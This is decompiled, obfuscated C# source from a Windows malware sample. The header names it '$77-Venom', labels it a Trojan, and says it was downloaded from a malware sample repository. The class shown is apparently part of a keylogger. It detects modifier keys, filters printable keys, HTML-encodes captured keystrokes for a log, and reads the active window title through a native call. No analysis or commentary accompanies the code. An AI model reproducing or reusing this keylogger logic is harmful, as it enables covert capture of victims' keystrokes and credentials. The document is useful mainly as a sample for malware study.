// Decompiled with JetBrains decompiler
// Type: Χ尡廬퓿ᾡꂫ芣簛앢쭭淺嚙͠뷇韬錚櫺㩩㧷
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

public static class Χ尡廬퓿ᾡꂫ芣簛앢쭭淺嚙͠뷇韬\uE93F錚櫺㩩㧷
{
  public static bool IsModifierKeysSet(this List<Keys> pressedKeys)
  {
    if (pressedKeys == null)
      return false;
    return pressedKeys.Contains(Keys.LControlKey) || pressedKeys.Contains(Keys.RControlKey) || pressedKeys.Contains(Keys.LMenu) || pressedKeys.Contains(Keys.RMenu) || pressedKeys.Contains(Keys.LWin) || pressedKeys.Contains(Keys.RWin) || pressedKeys.Contains(Keys.Control) || pressedKeys.Contains(Keys.Alt);
  }

  public static bool IsModifierKey(this Keys key) => key == Keys.LControlKey || key == Keys.RControlKey || key == Keys.LMenu || key == Keys.RMenu || key == Keys.LWin || key == Keys.RWin || key == Keys.Control || key == Keys.Alt;

  public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c) => pressedKeys.Contains((Keys) char.ToUpper(c));

  public static bool IsExcludedKey(this Keys k) => k >= Keys.A && k <= Keys.Z || k >= Keys.NumPad0 && k <= Keys.Divide || k >= Keys.D0 && k <= Keys.D9 || k >= Keys.OemSemicolon && k <= Keys.OemClear || k >= Keys.LShiftKey && k <= Keys.RShiftKey || k == Keys.Capital || k == Keys.Space;

  public static bool \uF2EC\u2947憼ṅ朿쪘㓧啰墄豎\uF06B屙\u2858Ώ\uE1BB얥엩邸肶ᓺ(List<char> list, char search) => list.FindAll(new Predicate<char>(new Χ尡廬퓿ᾡꂫ芣簛앢쭭淺嚙͠뷇韬\uE93F錚櫺㩩㧷.稖ﳚಃΓ焧\u2734쪉ᴖ\u0CD2篧镣甸ᾖ橃㣁\u0F3Cꔜ䌟傁\uED1E()
  {
    럤\uE94B쳃䍢秇䑒\uF3DFᇣ\u298C樴蛁涼ኮ⃑ꏈ\uFDE1鍕뼚쯻\u24B0 = search
  }.孴\uEC73\uEEAB㭺甀\u1735\uFFFD썩\u288F\uED07鴿ȷ\u2A3B\uE609욻ꈐ離ቆ輝愼)).Count > 1;

  public static string ꉥ姣鐔\u9FFF쬞흒\uF5AC\u2E22蘑铇斱甯\u334C\uEB91\uEC0D謨ݯ\u9FDD鈰\uE015(char key)
  {
    if (key < ' ')
      return string.Empty;
    switch (key)
    {
      case ' ':
        return "&nbsp;";
      case '"':
        return "&quot;";
      case '#':
        return "&#35;";
      case '&':
        return "&amp;";
      case '\'':
        return "&apos;";
      case '<':
        return "&lt;";
      case '>':
        return "&gt;";
      default:
        return key.ToString();
    }
  }

  public static string 둤闺\uE273\u2FF3\uF4FC짱䝨軟\u29D5ほ煄殞谜曢쬓\uE29C\u25A3\uF4EC\u20C6\u2916(
    string input)
  {
    return input.Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;").Replace("'", "&apos;");
  }

  public static string 晁ﻋ넳埰䲷䀞벞\uF39B킩滨\u2F16\uF354읍觊\u0895ନﴂ퍄巿\uE29E(Keys key, bool altGr = false)
  {
    string str = key.ToString();
    if (str.Contains("ControlKey"))
      return "Control";
    if (str.Contains("Menu"))
      return "Alt";
    if (str.Contains("Win"))
      return "Win";
    return str.Contains("Shift") ? "Shift" : str;
  }

  public static string \uFFFD挡멭텈\uF34E\uE476\uFFFD㨕\u20FFࢯ\uFD41躨珏\u29C1斢䌕䳓鋜ㄗ\u27B2()
  {
    StringBuilder lpString = new StringBuilder(1024);
    쑞縷\u32E1䠪䶙꺨赺\u2724瘝\u24AD빞謽縹ꂦ\uF7D0Ę\u2FB9㧑䧙ᾁ.ᬦ竸艫놲禈\u277F䗋擃ᩩ횕\u175F褦덅慡务\uF61C孡呫\uA87B학(쑞縷\u32E1䠪䶙꺨赺\u2724瘝\u24AD빞謽縹ꂦ\uF7D0Ę\u2FB9㧑䧙ᾁ.\uF70E\u1AAD欜봊본ཤ䯴ଷ喕텄\u0B00ꗆ돇彋䯬ᢘҸ猛㠋鎦(), lpString, lpString.Capacity);
    string str = lpString.ToString();
    return string.IsNullOrEmpty(str) ? (string) null : str;
  }
}
